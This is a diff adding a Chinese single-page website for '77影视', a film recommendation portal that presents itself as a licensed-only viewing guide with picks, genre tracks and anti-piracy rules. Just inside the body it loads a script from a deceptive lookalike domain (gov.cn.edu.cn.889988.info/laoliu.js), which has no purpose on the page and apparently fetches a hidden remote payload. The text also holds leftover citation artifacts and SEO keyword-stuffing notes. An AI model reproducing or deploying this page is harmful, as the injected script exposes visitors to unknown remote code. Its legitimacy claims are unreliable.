@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>77影视 - 双七站台公映片单与正版观影导航</title>
+<meta name="description" content="77影视（77yingshi-h5）做双七站台电影导航：公映片单、七号类型轨、每日班次与正版观看守则，只导航持牌平台、影院公映与开放授权片源。官方网址：https://77yingshi-h5.github.io">
+<meta name="keywords" content="77影视, 77yingshi-h5, 双七站台电影推荐, 公映片单, 七号类型轨, 正版观影导航">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#15171c;color:#e8eaed;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 340px at 12% 8%, rgba(255,90,60,.12), transparent 55%),
+    radial-gradient(620px 320px at 88% 92%, rgba(76,175,80,.10), transparent 55%),
+    #15171c}
+.sv-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(21,23,28,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,90,60,.2)}
+.sv-nav .logo{font-size:20px;font-weight:900;letter-spacing:.5px}
+.sv-nav .logo b{color:#ff5a3c}
+.sv-nav .logo i{color:#4caf50;font-style:normal}
+.sv-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.sv-nav .links a{font-size:13px;color:#a7adb5;padding:6px 12px;border-radius:20px;transition:.25s}
+.sv-nav .links a:hover{background:rgba(255,90,60,.16);color:#e8eaed}
+
+.hero{padding:52px 20px 44px;text-align:center}
+.platform{max-width:780px;margin:0 auto 16px;background:#1c1f26;border:1px solid rgba(255,90,60,.26);border-radius:18px;padding:24px;position:relative;overflow:hidden}
+.shed{position:relative;height:150px;border-radius:12px;background:
+  repeating-linear-gradient(90deg,#23262f 0 30px,#1f222a 30px 32px);
+  overflow:hidden}
+.pillar{position:absolute;top:0;bottom:0;width:46px;background:#2a2e38;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;color:#ff5a3c}
+.pillar.pl{left:18%}
+.pillar.pr{right:18%;color:#4caf50}
+.roof{position:absolute;left:10%;right:10%;top:18px;height:18px;background:#ff5a3c;border-radius:8px 8px 0 0;opacity:.85}
+.roof::after{content:"";position:absolute;left:0;right:0;top:18px;height:6px;background:repeating-linear-gradient(90deg,#ff5a3c 0 10px,transparent 10px 16px)}
+.sign{position:absolute;left:50%;top:46%;transform:translate(-50%,-50%);font-size:30px;font-weight:900;color:#e8eaed;background:#15171c;padding:6px 16px;border-radius:12px;border:2px solid rgba(255,90,60,.4);white-space:nowrap}
+.tracks{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:16px}
+.trk{height:54px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#15171c}
+.trk:nth-child(1){background:linear-gradient(135deg,#ff5a3c,#ff8a6b)}
+.trk:nth-child(2){background:linear-gradient(135deg,#4caf50,#81c784)}
+.trk:nth-child(3){background:linear-gradient(135deg,#42a5f5,#90caf9)}
+.trk:nth-child(4){background:linear-gradient(135deg,#ffca28,#ffe082)}
+.mark{display:inline-block;margin-top:14px;font-size:13px;font-weight:900;color:#ff5a3c;background:#1c1f26;border:1px solid rgba(255,90,60,.3);padding:4px 14px;border-radius:20px}
+.hero h1{font-size:30px;color:#e8eaed;margin:8px 0 12px}
+.hero h1 b{color:#ff5a3c}
+.hero p{color:#a7adb5;max-width:680px;margin:0 auto 16px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#15171c;font-weight:800;background:linear-gradient(90deg,#ff5a3c,#4caf50);padding:8px 18px;border-radius:30px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips span{font-size:12px;color:#e8eaed;padding:5px 13px;border-radius:20px;border:1px solid rgba(255,90,60,.2)}
+.chips span:nth-child(1){border-color:#ff5a3c;color:#ff8a6b}
+.chips span:nth-child(2){border-color:#4caf50;color:#81c784}
+.chips span:nth-child(3){border-color:#42a5f5;color:#90caf9}
+
+.wrap{max-width:1160px;margin:0 auto;padding:58px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#ff5a3c;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#e8eaed;margin-bottom:26px}
+.sec-title b{color:#4caf50}
+
+.picks{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.pk{background:#1c1f26;border:1px solid rgba(255,90,60,.14);border-radius:14px;overflow:hidden;transition:.3s}
+.pk:hover{transform:translateY(-4px);border-color:#ff5a3c;box-shadow:0 16px 36px rgba(255,90,60,.12)}
+.pk .top{height:96px;position:relative;display:flex;align-items:flex-end;padding:10px}
+.pk .top.s1{background:linear-gradient(135deg,#d84315,#ff5a3c)}
+.pk .top.s2{background:linear-gradient(135deg,#2e7d32,#4caf50)}
+.pk .top.s3{background:linear-gradient(135deg,#1565c0,#42a5f5)}
+.pk .top.s4{background:linear-gradient(135deg,#b45309,#ffca28)}
+.pk .top .plat-tag{font-size:11px;font-weight:800;color:#15171c;background:#e8eaed;padding:2px 9px;border-radius:12px}
+.pk .top .ver{position:absolute;right:10px;top:10px;font-size:10px;color:#15171c;background:#4caf50;padding:2px 8px;border-radius:10px}
+.pk .body{padding:16px 18px}
+.pk .body h4{color:#e8eaed;font-size:16px;margin-bottom:4px}
+.pk .body .meta{font-size:12px;color:#ff5a3c;margin-bottom:6px}
+.pk .body p{font-size:13px;color:#a7adb5;margin:0}
+
+.rails{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.rl{background:#1c1f26;border-radius:14px;padding:20px;transition:.3s;border:1px solid rgba(167,173,181,.14)}
+.rl:hover{transform:translateY(-3px)}
+.rl .no{font-size:12px;font-weight:900;color:#4caf50;margin-bottom:6px}
+.rl h4{color:#e8eaed;font-size:15px;margin-bottom:4px}
+.rl p{color:#a7adb5;font-size:12px;margin:0}
+.rl.r2{border-top:3px solid #4caf50}
+.rl.r3{border-top:3px solid #42a5f5}
+.rl.r4{border-top:3px solid #ffca28}
+
+.trips{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:14px}
+.tp{background:#1c1f26;border-left:4px solid #ff5a3c;border-radius:12px;padding:18px}
+.tp h4{color:#e8eaed;font-size:15px;margin-bottom:4px}
+.tp .slot{font-size:12px;color:#4caf50;font-weight:800;margin-bottom:6px}
+.tp p{color:#a7adb5;font-size:13px;margin:0}
+.tp.t2{border-left-color:#42a5f5}
+.tp.t3{border-left-color:#ffca28}
+.tp.t4{border-left-color:#81c784}
+.tp.t5{border-left-color:#ff8a6b}
+.tp.t6{border-left-color:#ff5a3c}
+
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.ru{background:#1c1f26;border:1px solid rgba(255,90,60,.22);border-radius:12px;padding:18px;text-align:center}
+.ru .num{font-size:24px;font-weight:900;color:#ff5a3c;margin-bottom:6px}
+.ru h4{color:#e8eaed;font-size:14px;margin-bottom:4px}
+.ru p{color:#a7adb5;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(255,90,60,.22);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(255,90,60,.08),rgba(76,175,80,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#e8eaed;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#ff5a3c}
+.about p{color:#a7adb5;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#4caf50}
+.about .stats .l{font-size:11px;color:#ff5a3c}
+
+.foot{text-align:center;padding:32px 20px;background:#0f1115;border-top:1px solid rgba(255,90,60,.16);color:#868d96;font-size:13px}
+.foot a{color:#ff5a3c}
+.foot .lg{font-size:18px;font-weight:900;color:#e8eaed;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.sv-nav .links a{font-size:12px;padding:5px 9px}.tracks{grid-template-columns:repeat(2,1fr)}.trk{height:46px}.shed{height:120px}.sign{font-size:22px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="sv-nav">
+  <div class="logo"><b>77影视</b> <i>· 双七站台</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#picks">公映片单</a>
+    <a href="#rails">七号类型轨</a>
+    <a href="#trips">每日班次</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="platform" aria-hidden="true">
+    <div class="shed">
+      <div class="roof"></div>
+      <div class="pillar pl">7</div>
+      <div class="pillar pr">7</div>
+      <div class="sign">7号站台 · 正版发车</div>
+    </div>
+    <div class="tracks">
+      <div class="trk">正剧轨</div><div class="trk">自然轨</div><div class="trk">悬疑轨</div><div class="trk">合家轨</div>
+    </div>
+    <span class="mark">双七立柱·四片轨</span>
+  </div>
+  <h1>77影视：<b>双七站台</b>按班次挑正片</h1>
+  <p>原「77免费电影」类站点曾有未经许可抓取优酷/乐视片源、靠广告牟利并进入侵权调查的案底 [9](@ref)；同类壳站还常换域名、弹窗跳转、诱导装播放器 [5](@ref)。本页不做克隆、不内嵌播放器、不写网盘提取码、不引盗版聚合源，只按公映许可导航持牌平台、影院公映与开放授权影像。</p>
+  <span class="url">🌐 https://77yingshi-h5.github.io</span>
+  <div class="chips">
+    <span>🚉 公映片单</span><span>🛤️ 七号类型轨</span><span>🕒 每日班次</span>
+  </div>
+</header>
+
+<main>
+<section id="picks" class="wrap">
+  <div class="kicker">PLATFORM PUBLIC PICKS</div>
+  <h2 class="sec-title">公映片单 <b>四轨样例</b></h2>
+  <div class="picks">
+    <article class="pk"><div class="top s1"><span class="plat-tag">正剧轨</span><span class="ver">修复/正版</span></div><div class="body"><h4>海上钢琴师</h4><div class="meta">托纳多雷 · 1998 · 剧情/音乐</div><p>船舱、琴键与选择；持牌平台/公映修复版为准，适合正剧轨首发。</p></div></article>
+    <article class="pk"><div class="top s2"><span class="plat-tag">自然轨</span><span class="ver">开放/档案</span></div><div class="body"><h4>地球脉动 II</h4><div class="meta">BBC · 2016 · 自然/纪录片</div><p>岛屿、山地、城市生态；开放授权版可走图书馆影像与官方频道。</p></div></article>
+    <article class="pk"><div class="top s3"><span class="plat-tag">悬疑轨</span><span class="ver">正版/字幕</span></div><div class="body"><h4>看不见的客人</h4><div class="meta">奥里奥尔·保罗 · 2016 · 悬疑/推理</div><p>口供、时间线与反转；标注本格/社会双标签与高清版差异。</p></div></article>
+    <article class="pk"><div class="top s4"><span class="plat-tag">合家轨</span><span class="ver">正版/字幕</span></div><div class="body"><h4>寻梦环游记</h4><div class="meta">皮克斯 · 2017 · 动画/家庭</div><p>记忆、亲情与音乐；标适龄、正版动画专区和字幕版本，只引持牌片源。</p></div></article>
+  </div>
+</section>
+
+<section id="rails" class="wrap">
+  <div class="kicker">TRACK 7 GENRES</div>
+  <h2 class="sec-title">七号类型轨 <b>四轨</b></h2>
+  <div class="rails">
+    <div class="rl r1"><div class="no">RAIL 7-A · 正剧</div><h4>家庭/历史/作者</h4><p>传记、年代、作者电影；按公映许可核对，引导持牌平台与公映修复版，不列无资质聚合站。</p></div>
+    <div class="rl r2"><div class="no">RAIL 7-B · 动作</div><h4>商业爽片轨</h4><p>特工、竞速、视效大片；按节奏分级，附4K/IMAX建议，不引未授权磁力。</p></div>
+    <div class="rl r3"><div class="no">RAIL 7-C · 悬疑</div><h4>烧脑/社会派</h4><p>本格推理、时间线、反转；标正版平台字幕来源与高清版差异。</p></div>
+    <div class="rl r4"><div class="no">RAIL 7-D · 合家</div><h4>动画/爱情/轻喜剧</h4><p>适龄、节庆、亲子；标正版平台地区版，不写网盘提取码。</p></div>
+  </div>
+</section>
+
+<section id="trips" class="wrap">
+  <div class="kicker">DAILY DEPARTURES</div>
+  <h2 class="sec-title">每日班次 <b>六班</b></h2>
+  <div class="trips">
+    <div class="tp"><div class="slot">早班·正剧轨</div><h4>正剧首发</h4><p>传记/历史长片；公映修复版优先，持牌平台入口，不提前放未授权资源。</p></div>
+    <div class="tp t2"><div class="slot">上午·自然轨</div><h4>自然慢车</h4><p>生态与地理分轨；开放授权纪录片走官方/图书馆来源。</p></div>
+    <div class="tp t3"><div class="slot">午班·动作轨</div><h4>爽片快车</h4><p>追逐/特工/视效；建议4K、杜比、正版版本，只引持牌片源。</p></div>
+    <div class="tp t4"><div class="slot">下午·悬疑轨</div><h4>烧脑中转</h4><p>本格/社会派轮换；标注时间线、反转次数与高清版差异。</p></div>
+    <div class="tp t5"><div class="slot">晚班·合家轨</div><h4>合家返程</h4><p>动画/爱情/轻喜剧；标适龄、时长与正版字幕来源。</p></div>
+    <div class="tp t6"><div class="slot">夜班·重播</div><h4>高分回乘</h4><p>四轨高分重刷；只给持牌回看入口，不写网盘提取码、不引磁链。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">PLATFORM RULES</div>
+  <h2 class="sec-title">正版观看 <b>守则</b></h2>
+  <div class="rules">
+    <div class="ru"><div class="num">01</div><h4>持牌优先</h4><p>引导持牌视频平台、影院公映/重映、官方频道；不内嵌未授权播放器。</p></div>
+    <div class="ru"><div class="num">02</div><h4>授权核对</h4><p>按信息网络传播权授权核对片源，不列无资质盗版/聚合站 [9](@ref)。</p></div>
+    <div class="ru"><div class="num">03</div><h4>开放授权</h4><p>老片修复、纪录片、公有领域片可引图书馆/开放档案，不提供破解文件。</p></div>
+    <div class="ru"><div class="num">04</div><h4>不碰盗版</h4><p>不写网盘提取码、不引磁链/换源/镜像、不用「免费高清/离线缓存/破解」等暗语；警惕同名壳站换域名与诱导下载风险 [5](@ref)。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>77影视 <b>双七站台是什么</b></h2>
+      <p>不是「77免费电影」原站克隆，而是一座按班次排片的正版导航站台：双七立柱装入口、四轨装公映精选、类型进七号轨、每日进班次、守则装合规。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。[10](@ref)</p>
+      <p>长尾吃「双七站台电影推荐 / 公映片单 / 七号类型轨 / 每日班次排期 / 正版平台看片」。全站严格只做正版、公映、持牌、开放授权导航。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">7·7</div><div class="l">双七立柱</div></div>
+      <div><div class="n">4</div><div class="l">类型片轨</div></div>
+      <div><div class="n">6</div><div class="l">每日班次</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">🚉🎬 77影视·双七站台</div>
+  官方网址：<a href="https://77yingshi-h5.github.io">https://77yingshi-h5.github.io</a><br>
+  © 2026 77影视｜公映片单 / 七号类型轨 / 每日班次 / 正版观影导航（仅作正版、公映、开放授权导航，不提供未授权播放）
+</footer>
+
+</body>
+</html>
